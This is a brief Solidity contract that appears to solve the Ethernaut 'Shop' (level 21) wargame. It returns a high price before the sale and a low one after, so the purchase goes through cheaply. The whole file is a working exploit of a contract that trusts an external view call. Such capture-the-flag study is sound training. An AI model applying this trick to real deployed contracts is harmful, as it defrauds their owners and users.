// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel21.sol";

contract BrokenShop {

    Shop level21 = Shop(0x0da9e767E8A1af4941ffAA331503Ae0729EC8E0a);

    function exploit() external {
        level21.buy();
    }

    function price () external view returns (uint) {
        return level21.isSold() ? 1 : 101;
    }
}

